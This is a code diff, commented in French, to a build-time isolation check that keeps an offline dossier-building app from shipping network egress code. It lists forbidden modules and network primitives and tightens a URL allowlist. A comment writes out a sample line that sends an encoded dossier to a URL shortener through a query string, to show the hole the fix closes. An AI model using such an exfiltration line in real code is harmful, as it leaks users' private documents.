@@ -7,8 +7,9 @@
  * tenue par la mécanique, pas par la discipline.
  *
  * Deux verrous indépendants, et il en faut deux :
- *  1. la CSP `connect-src 'self'` de `builder.pharnos.com` (`public-builder/_headers`) — le
- *     NAVIGATEUR refuse toute sortie tierce, même si du code fautif était livré ;
+ *  1. la CSP `connect-src 'self'` servie sur `builder.pharnos.com` (`web/public-builder/_headers`,
+ *     vérifiée par `npm run headers:builder`) — le NAVIGATEUR refuse toute sortie tierce, même si
+ *     du code fautif était livré ;
  *  2. ce contrôle-ci — le BUILD refuse de produire un artefact qui contient le code de sortie.
  *
  * Le 1 protège l'utilisateur, le 2 protège la promesse : un bundle qui embarque le client Supabase
@@ -72,14 +73,17 @@ export const FORBIDDEN_RULES: readonly ForbiddenRule[] = [
     why: 'module de synchronisation — la frontière même du produit autonome',
   },
   {
-    label: 'src/lib/outbox.ts',
-    matches: contains('/src/lib/outbox.ts'),
-    why: "file d'attente de remontée vers le serveur",
-  },
-  {
     label: 'src/lib/flush-outbox.ts',
+    // ⚠️ LE SENDER, et lui seul. `src/lib/outbox.ts` n'est PAS interdit : vérifié, il n'importe
+    // que Dexie et ne contient aucun appel réseau — c'est une file d'attente purement LOCALE.
+    // L'interdire bloquait `dossier-repository`, `catalogue/repository` et
+    // `dossier-attachments-repository`, c'est-à-dire tout le socle qu'on veut justement
+    // réutiliser (§5.1). Même erreur que d'interdire `roadmap-data.ts` pour son nom : ce qui
+    // compte est ce qu'un module FAIT, pas ce qu'il évoque.
+    // Conséquence assumée : dans le builder, la file se remplit et personne ne la vide. Elle est
+    // locale et bornée par le stockage ; sa purge est un sujet du lot B2 (export/compilation).
     matches: contains('/src/lib/flush-outbox.ts'),
-    why: "vidange de la file d'attente vers le serveur",
+    why: "vidange de la file d'attente VERS LE SERVEUR — le seul module de l'outbox qui émet",
   },
   {
     label: '@sentry/*',
@@ -100,6 +104,29 @@ export const FORBIDDEN_RULES: readonly ForbiddenRule[] = [
     label: 'src/features/admin/',
     matches: contains('/src/features/admin/'),
     why: "console d'administration Pharnos — hors périmètre",
+  },
+  // ── Frontière d'OFFRE, pas de sécurité ──────────────────────────────────────────────────────
+  // Le CTD Builder monte des dossiers conformes au CTD UEMOA. Le suivi de bout en bout — cycle de
+  // vie, relances, correspondance — est ce qui distingue l'abonnement `app.pharnos.com` (§2). Ces
+  // règles empêchent la frontière commerciale de s'effacer par un import distrait : c'est la même
+  // mécanique que pour le réseau, appliquée au périmètre vendu.
+  {
+    label: 'RoadmapPage (cycle de vie)',
+    // ⚠️ La PAGE, pas `roadmap-data.ts` : ce dernier porte les agences et les langues officielles
+    // (`agencyFor`, `officialLanguage`), dont le montage d'un dossier a légitimement besoin.
+    // Interdire le fichier de données casserait la réutilisation qu'on cherche justement à faire.
+    matches: contains('/src/features/workspace/RoadmapPage'),
+    why: 'suivi du cycle de vie — vendu avec la plateforme, pas avec le builder',
+  },
+  {
+    label: 'src/features/reminders/',
+    matches: contains('/src/features/reminders/'),
+    why: 'relances — vendues avec la plateforme, pas avec le builder',
+  },
+  {
+    label: 'src/features/correspondence/',
+    matches: contains('/src/features/correspondence/'),
+    why: 'correspondance avec les agences — vendue avec la plateforme',
   },
 ]
 
@@ -151,12 +178,31 @@ export type EgressHit = {
  * Toute URL hors de cette liste fait échouer le build — c'est le but : une nouvelle adresse dans
  * un produit « sans backend » doit être un acte conscient, pas un effet de bord.
  */
-// Liste tenue au plus juste : ces deux entrées sont les seules présentes dans l'artefact
-// (`http://www.w3.org/2000/svg` et consorts, `https://react.dev/errors/`). N'y ajouter une ligne
-// qu'après avoir constaté qu'elle est réellement émise.
+// Liste tenue au plus juste : n'y ajouter une ligne qu'après avoir CONSTATÉ que l'adresse est
+// réellement émise, et vérifié dans la source de la dépendance qu'aucun code ne la déréférence.
+//
+// ⚠️ Deux formes cohabitent, et la différence est la règle : un domaine de confiance s'autorise
+// par PRÉFIXE ; un raccourcisseur d'URL s'autorise par correspondance EXACTE et jamais autrement.
+// `tinyurl.com/*` ouvrirait la porte à n'importe quelle destination, présente ou future, décidée
+// par un tiers — c'est le contraire d'une liste blanche. Le test le vérifie.
 const URL_ALLOWLIST: readonly RegExp[] = [
-  /^https?:\/\/react\.dev\//,
-  /^https?:\/\/(www\.)?w3\.org\//,
+  // ⚠️ Ancrées par `$` sur un jeu de caractères qui EXCLUT `?` et `#` : une entrée de préfixe
+  // autorise un chemin, jamais une query. Sans cela, `https://react.dev/errors/?fuite=<dossier>`
+  // serait conforme — le préfixe est bon, et le reste emporte le dossier. Vérifié dans l'artefact
+  // réel : aucune URL légitime n'y porte de query (React n'émet que le préfixe `…/errors/` et le
+  // complète à l'exécution ; les entrées w3.org sont des espaces de noms XML).
+  /^https?:\/\/react\.dev\/[\w./-]*$/,
+  /^https?:\/\/(www\.)?w3\.org\/[\w./-]*$/,
+  // Dexie, messages d'exception. Vérifiés dans `node_modules/dexie/dist/dexie.js` :
+  //   • l. 381  `MissingAPI: 'IndexedDB API missing. Please visit https://tinyurl.com/y2uuvskb'`
+  //   • l. 4749 `PrematureCommit('Transaction committed too early. See http://bit.ly/2kdckMn')`
+  // Ce sont des LITTÉRAUX de chaîne dans des messages d'erreur : aucun `fetch`, aucun `open`,
+  // aucune navigation ne les prend en argument. Redirections résolues le 2026-08-04 (301) vers
+  // `dexie.org/docs/DexieErrors/Dexie.MissingAPIError` et `…/Dexie.PrematureCommitError.html`,
+  // c'est-à-dire la documentation de Dexie elle-même.
+  // Elles entrent maintenant parce que le socle de données (Dexie) entre avec le lot B1.
+  /^https:\/\/tinyurl\.com\/y2uuvskb$/,
+  /^http:\/\/bit\.ly\/2kdckMn$/,
 ]
 
 /**
@@ -171,7 +217,28 @@ const EGRESS_PRIMITIVES: readonly { readonly needle: string; readonly why: strin
   { needle: 'new EventSource', why: 'flux serveur' },
   { needle: 'XMLHttpRequest', why: 'requête sortante' },
   { needle: 'importScripts', why: 'chargement de code distant dans un worker' },
+  // La NAVIGATION de premier niveau est la seule sortie que la CSP ne couvre pas (`navigate-to` a
+  // été retirée de la spécification). Ces trois formes n'apparaissent pas une seule fois dans
+  // l'artefact actuel : les interdire ne coûte rien et ferme la porte par laquelle on emporterait
+  // un dossier dans une query string.
+  { needle: 'location.assign', why: 'navigation scriptée — la CSP ne la voit pas' },
+  { needle: 'location.replace', why: 'navigation scriptée — la CSP ne la voit pas' },
+  { needle: 'window.open', why: 'ouverture d’une origine tierce' },
 ]
+
+/**
+ * ⚠️ Ce que ce contrôle ne peut PAS voir, et qu'il faut savoir avant de le présenter comme une
+ * preuve : `location.href = <variable>`. La forme est indétectable par sous-chaîne — l'artefact
+ * contient déjà deux `location.href` parfaitement légitimes (React lit celui d'une iframe pour
+ * détecter le cross-origin, et teste `localhost`). L'interdire ferait échouer le build sur du code
+ * de React, pas sur une fuite.
+ *
+ * Ce qui reste couvert, et c'est l'essentiel : toute DESTINATION écrite en clair dans le code est
+ * vue par la règle d'URL ci-dessus, query et fragment compris. Une exfiltration a besoin d'une
+ * adresse ; si elle est littérale, le build la refuse. Si elle est entièrement calculée à
+ * l'exécution, aucune analyse statique ne la verra — et c'est la raison pour laquelle la CSP
+ * `connect-src 'self'` existe en second verrou, indépendant de celui-ci.
+ */
 
 /**
  * Cherche, dans le code RÉELLEMENT ÉMIS, toute adresse absolue non autorisée et toute primitive
@@ -180,7 +247,15 @@ const EGRESS_PRIMITIVES: readonly { readonly needle: string; readonly why: strin
 export function findEgress(files: Iterable<EmittedFile>): EgressHit[] {
   const hits: EgressHit[] = []
   for (const { file, code } of files) {
-    for (const match of code.matchAll(/https?:\/\/[\w.-]+(?:\/[\w./-]*)?/g)) {
+    // ⚠️ La query et le fragment font PARTIE de l'URL extraite, et c'est vital : les entrées de
+    // `URL_ALLOWLIST` qui se veulent exactes sont ancrées par `$`. Si l'extracteur s'arrêtait au
+    // `?`, l'ancre porterait sur une URL TRONQUÉE — et
+    // `location.href = 'https://tinyurl.com/y2uuvskb?d=' + btoa(dossier)` serait déclaré conforme
+    // alors qu'il exfiltre le dossier. Vérifié : c'était le cas avant ce correctif.
+    // Bornes : espaces et guillemets, c'est-à-dire ce qui termine un littéral dans du code émis.
+    for (const match of code.matchAll(
+      /https?:\/\/[\w.-]+(?:\/[\w./-]*)?(?:\?[^\s'"`)\]]*)?(?:#[^\s'"`)\]]*)?/g,
+    )) {
       const url = match[0]
       if (URL_ALLOWLIST.some((re) => re.test(url))) continue
       hits.push({ file, evidence: url, why: 'adresse absolue dans un produit sans backend' })
@@ -210,7 +285,7 @@ export function formatEgressFailure(hits: readonly EgressHit[]): string {
     "Le produit se vend sur l'absence de sortie réseau (PLAN-CTD-BUILDER §1). Si cette adresse",
     'est légitime et jointe par personne (espace de noms, lien de documentation), ajoute-la à',
     "URL_ALLOWLIST dans src/builder/isolation.ts, avec la raison. Si elle est appelée, c'est un",
-    'changement de nature du produit : il passe par la CSP de public-builder/_headers.',
+    'changement de nature du produit : il passe par la CSP de web/public-builder/_headers.',
   ].join('\n')
 }
 
@@ -224,6 +299,6 @@ export function formatIsolationFailure(hits: readonly ForbiddenHit[]): string {
     "L'édition autonome ne doit contenir aucune capacité de sortie réseau (PLAN-CTD-BUILDER §1).",
     "Retirer l'import fautif, ou — si la sortie est VOULUE (réservation de crédits, lot B3) —",
     'ajouter la règle correspondante en connaissance de cause dans src/builder/isolation.ts',
-    'ET ouvrir la CSP de public-builder/_headers dans le même commit.',
+    'ET ouvrir la CSP de web/public-builder/_headers dans le même commit.',
   ].join('\n')
 }
